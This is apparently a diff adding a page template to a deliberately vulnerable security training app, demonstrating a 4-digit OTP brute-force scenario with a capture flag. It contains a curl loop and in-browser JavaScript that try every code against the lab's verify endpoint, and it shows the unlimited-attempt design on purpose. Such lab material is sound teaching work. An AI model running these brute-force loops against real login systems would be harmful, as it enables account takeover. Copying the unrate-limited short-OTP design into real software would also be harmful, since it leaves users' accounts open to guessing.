@@ -1,0 +1,120 @@
+<%- include('../partials/navbar') %>
+  <main class="main-content">
+    <div class="top-header"><span class="header-title">Phone Verification</span>
+      <div class="header-right"><a href="/otp" class="btn btn-secondary btn-sm">← OTP Lab</a>
+        <a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a>
+      </div>
+    </div>
+    <div class="page-body">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;max-width:900px;align-items:start;">
+        <div>
+          <div class="card" style="border-color:var(--info);">
+            <div class="card-header" style="background:#EBF8FF;">
+              <h3>🔢 Scenario 6 — Short 4-Digit OTP</h3>
+              <span class="badge badge-info">Low Entropy</span>
+            </div>
+            <div class="card-body">
+              <% if(otp_hint){ %>
+              <div style="background:var(--success-bg);border:1px solid var(--success);border-radius:var(--radius);padding:10px;margin-bottom:14px;font-size:12px;">
+                🟢 OTP: <strong style="font-size:24px;letter-spacing:8px;font-family:monospace;color:var(--primary)"><%= otp_hint %></strong>
+              </div>
+              <% } %>
+              <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;">Enter your 4-digit verification code. Only <strong>10,000</strong> possible combinations — brute force in seconds.</p>
+              <div id="result-box" style="display:none;margin-bottom:14px;"></div>
+              <div class="form-group"><label>4-Digit Code</label>
+                <input type="text" id="otp-input" maxlength="4" placeholder="0000"
+                  style="font-size:32px;letter-spacing:12px;text-align:center;font-family:monospace;">
+              </div>
+              <div style="display:flex;gap:8px;">
+                <button onclick="verifyOTP()" class="btn btn-primary btn-lg" style="flex:1;">Verify</button>
+                <a href="/otp/short" class="btn btn-secondary">New OTP</a>
+              </div>
+              <div style="margin-top:10px;font-size:12px;color:var(--text-muted);">Attempts: <span id="attempt-count">0</span> / 10,000 max</div>
+              <div style="margin-top:8px;background:var(--border);border-radius:4px;height:6px;overflow:hidden;">
+                <div id="progress-bar" style="height:100%;background:var(--danger);width:0%;transition:width 0.1s;"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div>
+          <div class="card" style="margin-bottom:16px;border-color:var(--danger);">
+            <div class="card-header"><h3>⚡ In-Browser Brute Force</h3></div>
+            <div class="card-body">
+              <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px;">4-digit OTP = only 10,000 combinations. Watch it crack in real-time:</p>
+              <button onclick="runBrute()" class="btn btn-danger" style="margin-bottom:10px;width:100%;">▶ Auto Brute Force (0000–9999)</button>
+              <div id="brute-status" style="font-size:12px;font-family:monospace;color:var(--text-muted);">Press button to start...</div>
+              <div style="margin-top:8px;background:var(--border);border-radius:4px;height:8px;overflow:hidden;">
+                <div id="brute-bar" style="height:100%;background:var(--danger);width:0%;transition:width 0.05s;"></div>
+              </div>
+            </div>
+          </div>
+          <div class="card" style="margin-bottom:16px;">
+            <div class="card-header"><h3>Comparison: 4 vs 6 Digit</h3></div>
+            <div class="card-body">
+              <table style="font-size:12px;width:100%;">
+                <thead><tr style="border-bottom:1px solid var(--border);"><th style="padding:6px 0;">Type</th><th>Combinations</th><th>Brute Force Time*</th></tr></thead>
+                <tbody>
+                  <tr><td style="padding:5px 0;color:var(--danger);font-weight:700;">4-digit</td><td>10,000</td><td style="color:var(--danger);">~0.1 seconds</td></tr>
+                  <tr><td style="padding:5px 0;color:var(--warning);font-weight:700;">6-digit</td><td>1,000,000</td><td style="color:var(--warning);">~10 seconds</td></tr>
+                  <tr><td style="padding:5px 0;color:var(--success);font-weight:700;">8-digit</td><td>100,000,000</td><td style="color:var(--success);">>16 minutes</td></tr>
+                  <tr><td style="padding:5px 0;color:var(--success);font-weight:700;">TOTP (locked)</td><td>1,000,000</td><td style="color:var(--success);">∞ (30s window)</td></tr>
+                </tbody>
+              </table>
+              <div style="font-size:10px;color:var(--text-muted);margin-top:6px;">*At 100 requests/second with no rate limiting</div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header"><h3>curl Brute Force</h3></div>
+            <div class="card-body">
+              <pre style="font-size:10px;">for i in $(seq -w 0000 9999); do
+  r=$(curl -s "http://syntex.local/otp/short/verify?otp=$i" \
+    -H "Cookie: SYNTEX_SESS=SESSION")
+  if echo "$r" | grep -q '"success":true'; then
+    echo "[+] OTP: $i"
+    echo "$r"
+    break
+  fi
+done</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div><%- include('../partials/footer') %>
+<script>
+async function verifyOTP() {
+    const otp  = document.getElementById('otp-input').value.padStart(4,'0');
+    const r    = await fetch('/otp/short/verify', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp})});
+    const data = await r.json();
+    document.getElementById('attempt-count').textContent = data.attempts || '?';
+    document.getElementById('progress-bar').style.width = Math.min(((data.attempts||0)/10000*100),100)+'%';
+    const box = document.getElementById('result-box');
+    box.style.display = 'block';
+    box.innerHTML = data.success
+        ? `<div class="alert alert-success">✅ ${data.message}<br><code style="color:var(--success);">🚩 ${data.flag}</code></div>`
+        : `<div class="alert alert-danger">❌ Invalid. Attempt ${data.attempts}</div>`;
+}
+let bruteRunning = false;
+async function runBrute() {
+    if (bruteRunning) return;
+    bruteRunning = true;
+    const status = document.getElementById('brute-status');
+    const bar    = document.getElementById('brute-bar');
+    for (let i = 0; i <= 9999; i++) {
+        const otp = String(i).padStart(4,'0');
+        const r   = await fetch(`/otp/short/verify?otp=${otp}`);
+        const d   = await r.json();
+        bar.style.width = (i/9999*100)+'%';
+        if (i % 50 === 0) status.textContent = `Trying: ${otp} | Attempts: ${i}`;
+        if (d.success) {
+            status.innerHTML = `<strong style="color:var(--success);">✅ CRACKED! OTP = ${otp} | Attempts: ${d.attempts}</strong><br>🚩 ${d.flag}`;
+            document.getElementById('otp-input').value = otp;
+            bruteRunning = false;
+            return;
+        }
+        if (i % 10 === 0) await new Promise(r => setTimeout(r, 0));
+    }
+    bruteRunning = false;
+}
+</script>
